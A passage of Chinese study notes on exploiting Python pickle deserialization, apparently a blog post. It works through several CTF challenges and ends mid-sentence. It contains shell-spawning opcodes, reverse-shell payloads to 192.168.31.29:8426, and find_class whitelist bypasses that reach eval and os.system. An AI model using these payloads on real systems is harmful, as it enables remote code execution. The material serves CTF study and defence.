[{"categories":["NOTES\u0026SUMMARY"],"contents":"序列化\u0026amp;反序列化 在python中有好几个内置模块都可以干序列化\u0026amp;反序列化这个事，比如json, pickle/cpickle, shelve, marshal，而本文后面涉及到的序列化和反序列化操作若无特殊说明，指的都是pickle。\npickle后的对象以二进制字节流存储，能表示python几乎所有的类型（包括自定义类型），比如\n None 、 True 和 False 整数、浮点数、复数 str、byte、bytearray 只包含可封存对象的集合，包括 tuple、list、set 和 dict 定义在模块最外层的函数（使用 def 定义，lambda 函数则不可以） 定义在模块最外层的内置函数 定义在模块最外层的类 __dict__ 属性值或 __getstate__() 函数的返回值可以被序列化的类（详见官方文档的Pickling Class Instances）  当然也有例外，比如文件对象和网络套接字对象以及代码对象就不可以。\n对于一个Object，可以通过重写object.__reduce__()函数，使其被序列化时按照重写的方式进行；此函数会返回一个(callable, ([para1, para2, ...])[, ...])的元组，每当该类的对象被unpickle时，该callable就会被调用以生成对象（该callable其实是构造函数）。\npickle的常用方法有dumps(), loads()和dump(), load()，不带s的需要的参数是文件句柄，而带s的所需要的参数是字符串。\n说到pickle不得不谈的是opcode，即PVM(python virtual machine)的操作码，它可以被PVM的解析引擎解释处理。目前opcode有多不同的实现版本（但向下兼容），其中py2和py3序列化的结果是不同的，可以在调用函数时指定协议版本。\nimport pickle a={\u0026#39;1\u0026#39;: 1, \u0026#39;2\u0026#39;: 2} for i in range(4): print(f\u0026#39;ver_{i}\u0026#39;,pickle.dumps(a,protocol=i)) # python3输出 protocol\u0026lt;=5 ver_0: b\u0026#39;(dp0\\nV1\\np1\\nI1\\nsV2\\np2\\nI2\\ns.\u0026#39; ver_1: b\u0026#39;}q\\x00(X\\x01\\x00\\x00\\x001q\\x01K\\x01X\\x01\\x00\\x00\\x002q\\x02K\\x02u.\u0026#39; ver_2: b\u0026#39;\\x80\\x02}q\\x00(X\\x01\\x00\\x00\\x001q\\x01K\\x01X\\x01\\x00\\x00\\x002q\\x02K\\x02u.\u0026#39; ver_3: b\u0026#39;\\x80\\x03}q\\x00(X\\x01\\x00\\x00\\x001q\\x01K\\x01X\\x01\\x00\\x00\\x002q\\x02K\\x02u.\u0026#39; ver_4: b\u0026#39;\\x80\\x04\\x95\\x11\\x00\\x00\\x00\\x00\\x00\\x00\\x00}\\x94(\\x8c\\x011\\x94K\\x01\\x8c\\x012\\x94K\\x02u.\u0026#39; ver_5: b\u0026#39;\\x80\\x05\\x95\\x11\\x00\\x00\\x00\\x00\\x00\\x00\\x00}\\x94(\\x8c\\x011\\x94K\\x01\\x8c\\x012\\x94K\\x02u.\u0026#39; # python2输出 protocal\u0026lt;=2 ver_0: (dp0 S\u0026#39;1\u0026#39; p1 I1 sS\u0026#39;2\u0026#39; p2 I2 s. ver_1: }q(U\u00011q\u0001K\u0001U\u00012q\u0002K\u0002u. ver_2: �\u0002}q(U\u00011q\u0001K\u0001U\u00012q\u0002K\u0002u. 0号版本序列化的结果看起来可读性很强 都是可视的字符，操作码也比较直接地暴露出来，重点关注几个：\n   Opcode Mnemonic Description     ( MARK Push a mark object onto the stack   S STRING string   I INT Push integer or bool; decimal string argument   l LIST build a list from topmost stack items   d DICT build a dict from stack items   } EMPTY_DICT Push empty dict   t TUPLE Build a tuple from topmost stack items   ) EMPTY_TUPLE Push empty tuple   c GLOBAL Push self.find_class(module, args); 2 string args   R REDUCE Apply callable to argtuple, both on stack   b BUILD call __setstate__ or __dict__.update()   i INST build \u0026amp; push class instance   o OBJ build \u0026amp; push class instance   . STOP Every pickle ends with STOP    使用**pickletools**可以将opcode转化为肉眼可读取的形式\nimport pickletools data=b\u0026#34;\\x80\\x03cbuiltins\\nexec\\nq\\x00X\\x13\\x00\\x00\\x00key1=b\u0026#39;1\u0026#39;\\nkey2=b\u0026#39;2\u0026#39;q\\x01\\x85q\\x02Rq\\x03.\u0026#34; pickletools.dis(data) 0: \\x80 PROTO 3 2: c GLOBAL \u0026#39;builtins exec\u0026#39; 17: q BINPUT 0 19: X BINUNICODE \u0026#34;key1=b\u0026#39;1\u0026#39;\\nkey2=b\u0026#39;2\u0026#39;\u0026#34; 43: q BINPUT 1 45: \\x85 TUPLE1 46: q BINPUT 2 48: R REDUCE 49: q BINPUT 3 51: . STOP highest protocol among opcodes = 2 可以利用的方向\u0026amp;思路 pickle的应用场景其实很广泛\n 解析认证token, session时；参见：掌阅iReader某站Python漏洞挖掘（一个redis+python反序列化的栗子 可能将对象pickle后存储成磁盘文件 可能将对象pickle后在网络中传输 可能会通过参数传递给程序；参见：sqlmap的代码执行漏洞  这里说一下第一点，flask配合redis在服务端存储session（以pickle序列化形式进行存储），如果通过cookie进行请求session_id时，session种的内容就会被反序列化。理论上没问题，但如果出现redis的未授权访问，就可以通过自己设计恶意的session，然后再设置cookie去请求session时，我们自定的内容就会被反序列化，达到了rce的目的。\n构造反序列化的payload离不开__reduce__这个魔术方法（上文简单的提到过），它是新式类（内置类）特有的方法（关于更多python元类相关的知识可以参考stackoverflow的这篇帖子：What are metaclasses in Python?）\n————在python2有两种声明类的方式，并且它们实例化的对象性质是不同的\npython3中消除了两者的区别，表现为第二种\n回到关于__reduce__的问题，只要在新式类中定义一个 __reduce__ 方法，我们就能在序列化的使用让这个类根据我们在__reduce__ 中指定的方式进行序列化。指定的关键就在于该方法的返回值上：一个callable可调用的对象，一个是 ([para1, para2, ...])[, ...])，该对象所需的参数元组；最简单的例子是return (os.system, ('ls',))。__reduce__ 方法与opcode中的R指令码关系密切，可以说PVM的R指令码就是__reduce__的返回值的一个底层实现。\n此处上一个简单的小栗子 # shell.pickle cos system (S\u0026#39;/bin/sh\u0026#39; tR. 上面手写的opcode成功返回了sh的shell；而通过dumps和loads实现则是这样；我们执行的代码都在__reduce__中\n# py2 import pickle import os class A(object): def __reduce__(self): a = \u0026#39;/bin/sh\u0026#39; return (os.system,(a,)) a = A() test = pickle.dumps(a) print test pickle.loads(test) 也顺利返回了shell，很容易发现跟上面手写的opcode并无差异，而这个核心就是构造时的__reduce__函数的返回值，我们可以利用它来rce，反弹shell之类的。\n另一个反弹shell的小栗子 import pickle import os class A(object): def __reduce__(self): a = \u0026#34;\u0026#34;\u0026#34;python2 -c \u0026#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\u0026#34;192.168.31.29\u0026#34;,8426));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\u0026#34;/bin/sh\u0026#34;,\u0026#34;-i\u0026#34;]);\u0026#39;\u0026#34;\u0026#34;\u0026#34; return (os.system,(a,)) a=A() result = pickle.dumps(a) pickle.loads(result) # 或者最简单的手写opcode 不用特意构造class A() cos system (S\u0026#39;bash -c \u0026#34;bash -i \u0026gt;\u0026amp; /dev/tcp/192.168.31.29/8426 0\u0026gt;\u0026amp;1\u0026#34;\u0026#39; tR. 参考：Linux反弹shell（一）文件描述符与重定向 | Linux 反弹shell（二）反弹shell的本质\n  栗子1 - [DasCTF 0721] easyweb   之前写过了，在对session的处理时使用了pickle，我们可以构造恶意的session反弹shell；也没有特殊的过滤和限制，payload怎么写都行\n 用Marshal序列化任意代码对象 如果只在__reduce__中用-c参数执行代码的话，遇到一些自定函数 在格式上就会比较麻烦\n前面提到pickle不能序列化代码对象，来个实例\n# py2 import pickle def foo(): import os def fib(n): if n\u0026lt;=1: return n return fib(n-1)+fib(n-2) print \u0026#39;fib(10)=\u0026#39;,fib(10) os.system(\u0026#39;/bin/sh\u0026#39;) pickle.dumps(foo.func_code) 但也不是绝路一条，Marshal可以让这段代码序列化\n# py2 import marshal import base64 def foo(): import os def fib(n): if n \u0026lt;= 1: return n return fib(n-1) + fib(n-2) print \u0026#39;fib(10) =\u0026#39;, fib(10) os.system(\u0026#39;/bin/sh\u0026#39;) code_serialized = base64.b64encode(marshal.dumps(foo.func_code)) print code_serialized # YwAAAAABAAAAAgAAAAMAAABzOwAAAGQBAGQAAGwAAH0AAIcAAGYBAGQCAIYAAIkAAGQDAEeIAABkBACDAQBHSHwAAGoBAGQFAIMBAAFkAABTKAYAAABOaf////9jAQAAAAEAAAAEAAAAEwAAAHMsAAAAfAAAZAEAawEAchAAfAAAU4gAAHwAAGQBABiDAQCIAAB8AABkAgAYgwEAF1MoAwAAAE5pAQAAAGkCAAAAKAAAAAAoAQAAAHQBAAAAbigBAAAAdAMAAABmaWIoAAAAAHMFAAAAdTIucHlSAQAAAAUAAABzBgAAAAABDAEEAXMIAAAAZmliKDEwKT1pCgAAAHMHAAAAL2Jpbi9zaCgCAAAAdAIAAABvc3QGAAAAc3lzdGVtKAEAAABSAgAAACgAAAAAKAEAAABSAQAAAHMFAAAAdTIucHl0AwAAAGZvbwMAAABzCAAAAAABDAEPBA8B 现在得到了序列化的字符串，我们希望它被反序列化时执行，但是直接将他放入__reduce__返回部分似乎并不可以，__reduce__是调用callable来执行参数之类的，而我们构造好的本身就是callable，希望它执行而不是作为另一个callable的参数；这时就需要直接从PVM操作码的层级进行构造了。\n————其实我觉得更通俗的理解是这样可以不把要执行的代码限制在return (os.system,(a,))这样式的框架中，而是可以自由的执行代码，或者说就是另一种形式的pker\n我们需要执行的其实是（利用到python oop的特性，通过types.FunctionTyle(func_code,globals(),’’)()来动态地创建匿名函数，参见：官方文档）\n(types.FunctionType(marshal.loads(base64.b64decode(code_enc)), globals(), \u0026#39;\u0026#39;))() 或者更可读一些\ncode_str = base64.b64decode(code_enc) code = marshal.loads(code_str) func = types.FunctionType(code, globals(), \u0026#39;\u0026#39;) func() 接下来就是手动构造opcode的时候了，回想之前返回一个简单的shell时的opcode\ncos system (S\u0026#39;/bin/sh\u0026#39; tR. 开头的c后面跟的是引入的模块，换行之后是函数，再换行之后是执行的语句；根据这个结构把marshal和b64加进去\ncmarshal loads (cbase64 b64decode (S\u0026#39;YwAAAAAB........\u0026#39; tRtR 而globals()可以在__builtin__模块中引入\n{}{} c__builtin__ globals (tR 把上面的缝合起来得到最终的payload，注意添加(rR.\nctypes FunctionType (cmarshal loads (cbase64 b64decode (S\u0026#39;YwAAAAAB........\u0026#39; tRtRc__builtin__ globals (tRS\u0026#39;\u0026#39; tR(tR. 构造这个人看着费劲的payload的模板~（来源参见：Arbitrary code execution with Python pickles）\n# py2 import marshal import base64 def foo(): pass # Your code here print \u0026#34;\u0026#34;\u0026#34;ctypes FunctionType (cmarshal loads (cbase64 b64decode (S\u0026#39;%s\u0026#39; tRtRc__builtin__ globals (tRS\u0026#39;\u0026#39; tR(tR.\u0026#34;\u0026#34;\u0026#34; % base64.b64encode(marshal.dumps(foo.func_code)) 用pickle执行一下那串payload看看效果\n成功返回了斐波那契数列的结果和一个shell\n原理都是一样的，也可以用Marshal+b64的方式反弹shell（用模板生成opcode\nimport marshal import base64 def foo(): import os a = \u0026#39;bash -c \u0026#34;bash -i \u0026gt;\u0026amp; /dev/tcp/192.168.31.29/8426 0\u0026gt;\u0026amp;1\u0026#34;\u0026#39; # print \u0026#39;hold on...\u0026#39; os.system(a) print \u0026#34;\u0026#34;\u0026#34;ctypes FunctionType (cmarshal loads (cbase64 b64decode (S\u0026#39;%s\u0026#39; tRtRc__builtin__ globals (tRS\u0026#39;\u0026#39; tR(tR.\u0026#34;\u0026#34;\u0026#34; % base64.b64encode(marshal.dumps(foo.func_code)) ————或者下面这个模板也可以达到上面的效果（执行代码 而不包含类和函数）（来源：pickle_compiler.py\ntry: import cPickle as pickle except ImportError: import pickle from sys import argv def picklecompiler(sourcefile): sourcecode = file(sourcefile).read() return \u0026#34;c__builtin__\\neval\\n(c__builtin__\\ncompile\\n(%sS\u0026#39;\u0026lt;payload\u0026gt;\u0026#39;\\nS\u0026#39;exec\u0026#39;\\ntRtR.\u0026#34; % (pickle.dumps( sourcecode )[:-4],) def usage(): print \u0026#39;\u0026#39;\u0026#39;usage: python %sfilename\u0026#39;\u0026#39;\u0026#39; % argv[0] if __name__ == \u0026#34;__main__\u0026#34;: if len(argv) == 2: print picklecompiler(argv[1]) else: usage() 工具二连 - 通过pker构造opcode 原理参见：通过AST来构造Pickle opcode - 自动化构造，利用了抽象语法树\npker会用到GLOBAL, INST, OBJ这三种特殊函数和一些必要的转换方式；下面是pker的简单小栗子（更多使用说明详见上面的链接）\n  全局变量覆盖\n  # 覆盖直接由执行文件引入secret模块中的name和category模块 ecret = GLOBAL(\u0026#39;__main__\u0026#39;, \u0026#39;secret\u0026#39;) secret.name = \u0026#39;1\u0026#39; secret.category = \u0026#39;2\u0026#39;   # 覆盖引入模块的变量 game = GLOBAL(\u0026#39;guess_game\u0026#39;, \u0026#39;game\u0026#39;) game.curr_ticket = \u0026#39;123\u0026#39;     函数执行\n  # 通过b\u0026#39;R\u0026#39;调用 __reducce__方法 s = \u0026#39;whoami\u0026#39; system = GLOBAL(\u0026#39;os\u0026#39;, \u0026#39;system\u0026#39;) system(s) return   # 通过b\u0026#39;i\u0026#39;调用 INST(\u0026#39;os\u0026#39;, \u0026#39;system\u0026#39;, \u0026#39;whoami\u0026#39;)   # 通过b\u0026#39;c\u0026#39;和b\u0026#39;o\u0026#39;调用 OBJ(GLOBAL(\u0026#39;os\u0026#39;, \u0026#39;system\u0026#39;), \u0026#39;whoami\u0026#39;)   # 多参数调用函数 INST(\u0026#39;[module]\u0026#39;, \u0026#39;[callable]\u0026#39;[, param0, param1...]) OBJ(GLOBAL(\u0026#39;[module]\u0026#39;, \u0026#39;[callable]\u0026#39;)[, param0, param1...])     实例化对象（特殊的函数执行）\n  animal = INST(\u0026#39;__main__\u0026#39;, \u0026#39;Animal\u0026#39;,\u0026#39;1\u0026#39;,\u0026#39;2\u0026#39;) return animal   animal = OBJ(GLOBAL(\u0026#39;__main__\u0026#39;, \u0026#39;Animal\u0026#39;), \u0026#39;1\u0026#39;,\u0026#39;2\u0026#39;) return animal   animal = INST(\u0026#39;__main__\u0026#39;, \u0026#39;Animal\u0026#39;) animal.name=\u0026#39;1\u0026#39; animal.category=\u0026#39;2\u0026#39; return animal     先对题目有大概思路，然后辅以工具~好耶\n工具二连 - anapickle 其实一个年龄很大的脚本了，支持python2.3。。。。但是包含了很多payload，可以灵活运用~\nbypass!!! 对类型的检查 可以在已经构造好的opcode后面去掉.再续上相应的对象的opcode，作为栈顶的值供检查\n限制b'c'对模块的引入 - find_class()的重写 修改find_class()会引入函数\u0026amp;模块的白名单，一定程度上解决pickle的安全性问题；以下两种情况会调用find_class()的检查：\n opcode角度：出现c, i, b'\\x93'会调用 python角度：find_class()只会在解析opcode时调用一次，只要绕过opcode的执行过程，之后再产生的函数在黑名单中也不会拦截（比如通过__import__来绕过）  \u0026ndash;\u0026raquo;仅可以引入__main__开头的模块 “通过GLOBAL指令引入的变量可以看作是原变量的引用，我们在栈上修改它的值，也会修改原变量”，基于这一原理，当c指令只允许__main__时，我们可以引入__main__.blue（blue见题行事 上下文中会提前引入）这个module，再将一个dict压入栈，内容是{'name': 'rua', 'grade': 'www'}；之后执行BUILD指令，将会改写__main__.blue.name和 __main__.blue.grade，此时已经执行了我们想要的变量覆盖。之后弹掉栈顶，现在为空栈，拼接上正常的Student对象序列化后的opcode。此时的完整opcode在被反序列化时，栈顶是正常的Student对象，而被执行时却会先执行一遍前面的过程，造成变量覆盖。\n既然我们可以做到重写变量的值，那也可以将这个值改为read wrapper的返回值做到任意文件读取（详见后面的内容）\n\u0026ndash;\u0026raquo;仅可以引入题目中自设的模块\u0026amp;模块名不能有__符   栗子2 - [SUCTF 2019]Guess Game   本地复现还是失败，无解，docker地址-\u0026gt;https://github.com/rmb122/suctf2019_guess_game是个猜数游戏，交互逻辑在init.py, Game.py和Ticket.py中，10以内的数字需要猜对10次（全胜）才会返回flag\n然后是game_client.py\n接收数字的输入作为参数生成Ticket对象，序列化后发送到server端\n再看game_server.py，用了重写了的find_class()\n这个限制的意思是导入的模块只能以guess_name开头并且名字里没有__\n大概看完了流程，接下来找找突破口——序列化时是生成一个Ticket的实例\n判断输赢则是需要Game辅助\n结合game_server.py的判断条件，拿到flag需要self.win_count == max_round == 10\n那么构造的方向有了——修改相关参数做到变量覆盖，再以序列化的opcode形式传过去。手写opcode面临的问题就是重写find_class()后对加载指定模块的限制，而这里我们可以看到__init__.py中game = Game()，所以直接可以通过guess_game.game引入Game()类，然后修改类中的win_count和round_count就能做到变量覆盖；第二要注意必须手写opcode，如果是先from guess_name import game，然后修改参数后再dump，则是在运行时重新新建一个Game对象，就不是从guess_game这个module中获取，破坏上下文；第三要注意\npickle序列化流执行完会把栈顶的值返回，所以栈顶需要设为Ticket，这里可以dumps一个Ticket，然后拼到之前手写的opcode之后\nopcodes:\n# 修改win_count = 10和round_count = 9，传过去之后执行一次round_count += 1就能全胜 cguess_name game }S\u0026#34;win_count\u0026#34; I10 sS\u0026#34;round_count\u0026#34; I9 sbcguess_game.Ticket\\nTicket\\nq\\x00)\\x81q\\x01}q\\x02X\\x06\\x00\\x00\\x00numberq\\x03K\\x06sb. # c之后是被find_class()监控的区域，拼接Ticket import socket import struct s = socket.socket() s.connect((\u0026#39;node4.buuoj.cn\u0026#39;, 28803)) exp = b\u0026#39;\u0026#39;\u0026#39;cguess_game game }S\u0026#34;win_count\u0026#34; I10 sS\u0026#34;round_count\u0026#34; I9 sbcguess_game.Ticket\\nTicket\\nq\\x00)\\x81q\\x01}q\\x02X\\x06\\x00\\x00\\x00numberq\\x03K\\x06sb.\u0026#39;\u0026#39;\u0026#39; s.send(struct.pack(\u0026#39;\u0026gt;I\u0026#39;, len(exp))) s.send(exp) print(s.recv(1024)) print(s.recv(1024)) print(s.recv(1024)) print(s.recv(1024)) ————用pker\nticket = INST(\u0026#39;guess_game.Ticket\u0026#39;, \u0026#39;Ticket\u0026#39;, 0) game = GLOBAL(\u0026#39;guess_game\u0026#39;, \u0026#39;game\u0026#39;) game.curr_ticket = ticket return ticket # b\u0026#34;(I0\\niguess_game.Ticket\\nTicket\\np0\\n0cguess_game\\ngame\\np1\\n0g1\\n(N(S\u0026#39;curr_ticket\u0026#39;\\ng0\\ndtbg0\\n.\u0026#34;  \u0026ndash;\u0026raquo;仅可以引入builtins模块 更多知识参考：深入理解Python中的__builtin__和__builtins__ | [Python 的内建对象](https://www.jianshu.com/p/645e973 83c1f) | __builtins__ 与 __builtin__（builtins）\n  栗子3 - [Code-Breaking 2018] picklecode   本地复现还是失败，docker地址-\u0026gt;https://github.com/phith0n/code-breaking/tree/master/2018/picklecode（就跟被docker诅咒了一样 从来没有成功的用docker复现过一道题😭😭😭真就脑补出flag了\n审计源码，是一个django的项目（正好之前的实训做的就是django的项目，看源码轻松一些），主文件夹是core，有一个名为challenge的app\n看core下的settings.py比默认的配置多了54和55行\n用了特殊的SESSION_ENGINE和SESSION_SERIALIZER，前者指的是django将用户认证信息存储在哪里 后者指django用什么方式存储认证信息，也就相当于先经过SESSION_SERIAZLIZER指定的方式转换为字符串，再有SESSION_ENGINE指定的方式存储到某个地方。默认的django项目中，存储位置应该是django.contrib.sessions.backends.db，序列化方式应该是django.contrib.sessions.serializers.JSONSerializer；而这里就是用pickle序列化后的形式，加签名singed后存储在cookie中。那这里肯定要控制session，结合pickle来rce了；跟过去看看\n依旧是重写了find_class()方法，只有模块是内置的builtins（不需要import就可以用的）并且名字不能在黑名单中才可以；这里的绕过是第二个考点了，先翻回去看一下仅有的app的views.py\n模板部分直接拼接了request.user.username，这是注册时传入，有模板注入漏洞，找找调用链\n（因为本地环境太垃圾了 没复现 这里云做题了）在模板处下断点，可以看到很多的上下文变量，通常会存在的有request, user, perms，这里用的利用链是（注意django模板引擎无法读取下划线开头的属性）{{request.user.groups.source_field.opts.app_config.module.admin.settings.SECRET_KEY}}，注册一个名为这个的用户即可获得签名的密钥。\n再掉头回去思考opcode的编写。重写find_class()之后限制很多，但通过builtins仍然可以用getattr()；那么就分两步走，先通过builtins.getattr('builtins, 'eval')来获取eval()，再执行代码。那么如何手写protocol=0的opcode捏？\n首先引入模块builtins和函数getattr\ncbuiltins getattr 然后需要获取当前的上下文，用globals()\ncbuiltins globals globals是个字典，所以还要获取dict这个对象\ncbuiltins dict 还要执行globals()获取完整上下文\ncbuiltins globals (tR 栈顶元素是builtins.globals，压入一个空元组(t，然后用R执行\n然后用dict.get()方法从globals的字典中拿到键名为builtions的值\ncbuiltins getattr (cbuiltins dict S\u0026#39;get\u0026#39; tR(cbuiltins globals (tRS\u0026#39;builtins\u0026#39; tR. 反序列化后得到builtins对象\u0026lt;module 'builtins' (built-in)\u0026gt;；之后再用getattr从builtins对象中取出eval，也就是再套一层娃\ncbuiltins getattr (cbuiltins getattr (cbuiltins dict S\u0026#39;get\u0026#39; tR(cbuiltins globals (tRS\u0026#39;builtins\u0026#39; tRS\u0026#39;eval\u0026#39; tR. \u0026lt;built-in function eval\u0026gt;现在已经拿到了eval对象，再执行代码\ncbuiltins getattr (cbuiltins getattr (cbuiltins dict S\u0026#39;get\u0026#39; tR(cbuiltins globals (tRS\u0026#39;builtins\u0026#39; tRS\u0026#39;eval\u0026#39; tR(S\u0026#39;__import__(\u0026#34;os\u0026#34;).system(\u0026#34;ls\u0026#34;)\u0026#39; tR. 成功执行代码（注意运行时不仅需要引入pickle 也要引入builtins才可以！）\n理解opcode时需要注意\n————用pker\ngetattr = GLOBAL(\u0026#39;builtins\u0026#39;, \u0026#39;getattr\u0026#39;) dict = GLOBAL(\u0026#39;builtins\u0026#39;, \u0026#39;dict\u0026#39;) dict_get = getattr(dict, \u0026#39;get\u0026#39;) globals = GLOBAL(\u0026#39;builtins\u0026#39;, \u0026#39;globals\u0026#39;) builtins = globals() __builtins__ = dict_get(builtins, \u0026#39;__builtins__\u0026#39;) eval = getattr(__builtins__, \u0026#39;eval\u0026#39;) eval(\u0026#39;__import__(\u0026#34;os\u0026#34;).system(\u0026#34;whoami\u0026#34;)\u0026#39;) return # b\u0026#39;cbuiltins\\ngetattr\\np0\\n0cbuiltins\\ndict\\np1\\n0g0\\n(g1\\nS\\\u0026#39;get\\\u0026#39;\\ntRp2\\n0cbuiltins\\nglobals\\np3\\n0g3\\n(tRp4\\n0g2\\n(g4\\nS\\\u0026#39;__builtins__\\\u0026#39;\\ntRp5\\n0g0\\n(g5\\nS\\\u0026#39;eval\\\u0026#39;\\ntRp6\\n0g6\\n(S\\\u0026#39;__import__(\u0026#34;os\u0026#34;).system(\u0026#34;whoami\u0026#34;)\\\u0026#39;\\ntR.\u0026#39; 参考：wp1 | Code-Breaking中的两个Python沙箱 | Python 格式化字符串漏洞（Django为例）\n \u0026ndash;\u0026raquo;仅可以引入sys模块\u0026amp;名字中不带.点号   栗子4 - [BalsnCTF 2019] Pyshv1   题目环境-\u0026gt;https://github.com/sasdf/ctf/tree/master/tasks/2019/BalsnCTF/misc/pyshv1\n审计一下源码，先看一下肯定会不secure的securePickle.oy\n重写find_class()，被调用时可以灵活添加白名单；再看看server.py\n将输入的内容先转为ascii码形式被b64加密，再反序列化出来；其中白名单是sys模块\n但是这个sys模块并不安全：sys模块有一个字典对象sys.modules，它包含了运行时所有py程序所引入的所有模块(a cache of imported modules) ，如果它被改变 引入的模块就会被改变。而它也包括sys本身，也就是套娃sys.modules['sys']=sys.modules。那么如果我们先从sys中引入modules: import modules from sys，然后将modules['sys']改为modules['os']就将成功引入os模块。\n但有个缺陷是modules为dict，需要用getattr(sys.modules[module], name)进行取值，也就是先取出modules中的get函数，然后再用get来取出os，再进行替换修改\npker\nmodules=GLOBAL('sys', 'modules') modules['sys']=modules modules_get=GLOBAL('sys', 'get') os=modules_get('os') modules['sys']=os system=GLOBAL('sys', 'system') system('dir') return opcode:\nb\u0026quot;csys\\nmodules\\np0\\n0g0\\nS'sys'\\ng0\\nscsys\\nget\\np2\\n0g2\\n(S'os'\\ntRp3\\n0g0\\nS'sys'\\ng3\\nscsys\\nsystem\\np5\\n0g5\\n(S'dir'\\ntR.\u0026quot;  \u0026ndash;\u0026raquo;仅可以引入题目中自设空模块   栗子5 - [BalsnCTF 2019] Pyshv2   题目环境-\u0026gt;https://github.com/sasdf/ctf/tree/master/tasks/2019/BalsnCTF/misc/pyshv2\nfind_class()稍有区别，在getattr()之前先用了__import__()\n这次的白名单是structs，然鹅这是个空的模块 虚晃一枪。不过是空的不要紧，照样有内置方法。\n__builtins__是所有模块公有的字典，记录所有的内建函数，可以通过对__builtins__内相应的键来修改对应的函数，上图中我们找到了eval方法，但取出eval这个键另外需要一个get方法才能做到。\n我们知道，__getattribute__魔术方法可以访问任意属性。而同时__import__并不是铁板一块，它的全部参数是__import__(name, globals=None, locals=None, fromlist=(), level=0)，它可以被替换（通过导入builtins模块并赋值给builtins.__import__）来可以修改import语句的语义并且不会导致代码问题，而题目中重写的find_class()特地在getattr()之前调用了__import__，现在我们可以劫持这个__import__，让它变为__getattribute__，让我们引入的structs变为structs.__getattribute__(structs).xxx。\n对于引入模块的检查只会出现在b\u0026rsquo;c\u0026rsquo;时，所以我们在用S操作码劫持__import__时并不会引发find_class()的过滤。\n然而我们不能直接getattr()=getattr()这样覆盖__import__，我们还需要__dict__的帮忙。__dict__是一个列表，存储并决定了一个对象的所有属性，如果它的内容被改变，属性也会跟着改变。\n所以整合一下上面的思路：我们先要引入助手liststructs.__dict__，取出structs空模块的内建函数（一个待取的dict）structs.__builtins__和我们需要的魔术方法structs.__getattribute__。之后从内建函数structs.__builtins__中将键名为__import__的值替换为structs.__getattribute__，然后借助__dict__将structs的structs属性覆盖为修改后的内建函数。这时，我们再次用b\u0026rsquo;c\u0026rsquo;从structs中引入get时触发find_class()中的__import__，也就相当于在执行structs.__getattribute__('structs').get，这样我们就拿到了get方法。而之前我们又已经替换了structs属性为内建函数__builtins__，所以利用这个得到的get方法就可以从__builtins__中取出eval，执行代码了。之后执行代码的部分同上面的sys.modules的思路。\npker\n__dict__ = GLOBAL(\u0026#39;structs\u0026#39;, \u0026#39;__dict__\u0026#39;) __builtins__ = GLOBAL(\u0026#39;structs\u0026#39;, \u0026#39;__builtins__\u0026#39;) gtat = GLOBAL(\u0026#39;structs\u0026#39;, \u0026#39;__getattribute__\u0026#39;) __builtins__[\u0026#39;__import__\u0026#39;] = gtat __dict__[\u0026#39;structs\u0026#39;] = __builtins__ builtin_get = GLOBAL(\u0026#39;structs\u0026#39;, \u0026#39;get\u0026#39;) eval = builtin_get(\u0026#39;eval\u0026#39;) eval(\u0026#39;pickle.sys.modules[\u0026#39;os\u0026#39;].system(\u0026#39;cat ../flag.txt\u0026#39;)\u0026#39;) return opcode\nb\u0026quot;cstructs\\n__dict__\\np0\\n0cstructs\\n__builtins__\\np1\\n0cstructs\\n__getattribute__\\np2\\n0g1\\nS'__import__'\\ng2\\nsg0\\nS'structs'\\ng1\\nscstructs\\nget\\np5\\n0g5\\n(S'eval'\\ntRp6\\n0g6\\n(S'pickle.sys.modules['os'].system('cat ../flag.txt')'\\ntR.\u0026quot;  禁止b\u0026rsquo;R' 也就相当于不可以用__reduce__，有以下几种应对方法（以下方法同样可以单独使用鸭！！！），变量覆盖（无直接代码执行）或利用b'i'，b'i'，b'b'这些操作码来rce。\n\u0026ndash;\u0026raquo;变量覆盖   [高校战“疫”网络安全分享赛2020] webtmp   （这个题是缝合的[SJTU 2019]Pickle 以及 [SJTU 2019]Pickle-Revenge的题 = =。限制了R操作码，同时重写find_class()限制引入模块为__main__，两个考点）\nimport base64 import io import sys import pickle from flask import Flask, Response, render_template, request import secret app = Flask(__name__) class Animal: def __init__(self, name, category): self.name = name self.category = category def __repr__(self): return f\u0026#39;Animal(name={self.name!r}, category={self.category!r})\u0026#39; def __eq__(self, other): return type(other) is Animal and self.name == other.name and self.category == other.category class RestrictedUnpickler(pickle.Unpickler): def find_class(self, module, name): if module == \u0026#39;__main__\u0026#39;: return getattr(sys.modules[\u0026#39;__main__\u0026#39;], name) raise pickle.UnpicklingError(\u0026#34;global \u0026#39;%s.%s\u0026#39; is forbidden\u0026#34; % (module, name)) def restricted_loads(s): return RestrictedUnpickler(io.BytesIO(s)).load() def read(filename, encoding=\u0026#39;utf-8\u0026#39;): with open(filename, \u0026#39;r\u0026#39;, encoding=encoding) as fin: return fin.read() @app.route(\u0026#39;/\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def index(): if request.args.get(\u0026#39;source\u0026#39;): return Response(read(__file__), mimetype=\u0026#39;text/plain\u0026#39;) if request.method == \u0026#39;POST\u0026#39;: try: pickle_data = request.form.get(\u0026#39;data\u0026#39;) if b\u0026#39;R\u0026#39; in base64.b64decode(pickle_data): return \u0026#39;No... I don\\\u0026#39;t like R-things. No Rabits, Rats, Roosters or RCEs.\u0026#39; else: result = restricted_loads(base64.b64decode(pickle_data)) if type(result) is not Animal: return \u0026#39;Are you sure that is an animal???\u0026#39; correct = (result == Animal(secret.name, secret.category)) return render_template(\u0026#39;unpickle_result.html\u0026#39;, result=result, pickle_data=pickle_data, giveflag=correct) except Exception as e: print(repr(e)) return \u0026#34;Something wrong\u0026#34; sample_obj = Animal(\u0026#39;一给我哩giaogiao\u0026#39;, \u0026#39;Giao\u0026#39;) pickle_data = base64.b64encode(pickle.dumps(sample_obj)).decode() return render_template(\u0026#39;unpickle_page.html\u0026#39;, sample_obj=sample_obj, pickle_data=pickle_data) if __name__ == \u0026#39;__main__\u0026#39;: app.run(host=\u0026#39;0.0.0.0\u0026#39;, port=5000) 看源码，opcode部分ban掉了R操作码（调用一个callable对象），不能用__reduce__了；也重写了find_class()，module必须是__main__；我们的目标是\nrestricted_loads(base64.b64decode(pickle_data)) == Animal(secret.name, 